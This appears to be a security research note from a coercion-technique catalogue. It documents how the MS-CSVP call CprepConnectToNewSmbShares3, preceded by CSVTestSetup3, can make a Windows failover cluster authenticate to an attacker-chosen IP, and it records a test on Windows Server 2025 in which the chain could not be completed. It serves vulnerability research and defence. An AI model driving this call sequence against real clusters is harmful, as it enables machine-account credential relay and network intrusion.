# MS-CSVP - Remote call to CprepConnectToNewSmbShares3 (opnum 8)

## Summary

+ **Protocol**: [[MS-CSVP]: Failover Cluster: Setup and Validation Protocol (ClusPrep)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-csvp/600931f0-739b-4c09-8ddf-05555438c279)

+ **Interface**: `IClusterStorage3` (IID `11942D87-A1DE-4E7F-83FB-A840D9C5928D`), reached by **DCOM activation** of the ClusPrep storage class (CLSID `C72B09DB-4D53-4F41-8DCC-2D752AB56F7C`). There is no named pipe.

+ **Function name**: [`CprepConnectToNewSmbShares3`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-csvp/aa2f7339-c1f7-473b-a2b7-94838b6657d4)

+ **Function operation number**: `8`

+ **Authenticated**: Yes (cluster administrative access)

## Description

`CprepConnectToNewSmbShares3` is, by design, an **outbound-SMB primitive**: per [MS-CSVP] it
"attempts to connect to shares represented by **ClusPrepShares** in the **ClusprepShareList** at the
given list of **IP address strings**." The IP-address list (`ppwszSharePaths`) is fully
caller-controlled, so pointing it at a listener makes the cluster service (machine account)
authenticate outbound to `\\<attacker-IP>\<ClusPrepShareName>` — a coercion.

```cpp
HRESULT CprepConnectToNewSmbShares3(
   [in, string, size_is(dwNumberOfPaths,)] LPWSTR* ppwszSharePaths,
   [in] DWORD dwNumberOfPaths
 );
```

+ **Coerced parameter**: `ppwszSharePaths` — an array of **IP address strings** the server connects to.
+ **`dwNumberOfPaths`**: element count.

### Required call sequence

`ppwszSharePaths` supplies only the *IP addresses*; the *share names* come from **ClusprepShareList**,
which must be populated first. On `IClusterStorage3` the relevant methods are:

- `CprepCreateNewSmbShares3` (opnum 7) — only **retrieves** the node's own IPs formatted as `\\<IP>`; it does not populate the share list.
- `CSVTestSetup3` (opnum 5) — `CSVTestSetup3(TestShareGuid, Reserved)` sets up the CSV test share that populates `ClusprepShareList`.
- `CprepConnectToNewSmbShares3` (opnum 8) — then connects to those shares at the supplied IPs.

## Testing status — REACHABLE and activatable, but not completable without cluster CSV storage

Tested against **Windows Server 2025** (domain controller) with a formed single-node cluster
(`CL01`), 2026-09-14.

- After the cluster was formed, the cluster DCOM is reachable (the cluster firewall rules are
  enabled by cluster creation — no dynamic-port timeout), and
  `CoCreateInstanceEx(CLSID C72B09DB..., IID_IClusterStorage3)` **activates successfully**.
- `CprepConnectToNewSmbShares3(ppwszSharePaths=[<listener IP>], dwNumberOfPaths=1)` returned
  **`0x80070006` ERROR_INVALID_HANDLE** with no outbound connection, because **ClusprepShareList was
  empty** (no ClusPrepShare to connect to).
- Attempting to populate the list with `CSVTestSetup3(TestShareGuid=<random GUID>, Reserved="")`
  returned **`0x80070057` E_INVALIDARG** on this single-node cluster, which has **no CSV / shared
  storage configured**. Without a valid ClusPrepShare the connect step cannot proceed.

**Conclusion:** `CprepConnectToNewSmbShares3` is a genuine by-design coercion primitive (it dials
attacker-supplied IPs over SMB as the machine account) and the interface is reachable and
activatable on a formed cluster, but completing it requires `ClusprepShareList` to be populated via
the CSV validation setup, which needs a cluster that has **CSV / shared storage** configured. On a
bare single-node cluster with no shared storage this could not be driven to the outbound connection.
A cluster with configured CSV storage is expected to complete the coercion.

### Prerequisites

+ A **formed cluster** (ClusSvc running) — the feature alone is insufficient.
+ Cluster administrative access.
+ **CSV / shared storage** configured on the cluster (to satisfy `CSVTestSetup3`).

## References

+ [MS-CSVP]: Failover Cluster: Setup and Validation Protocol (ClusPrep): https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-csvp/600931f0-739b-4c09-8ddf-05555438c279

+ `CprepConnectToNewSmbShares3` (opnum 8): https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-csvp/aa2f7339-c1f7-473b-a2b7-94838b6657d4
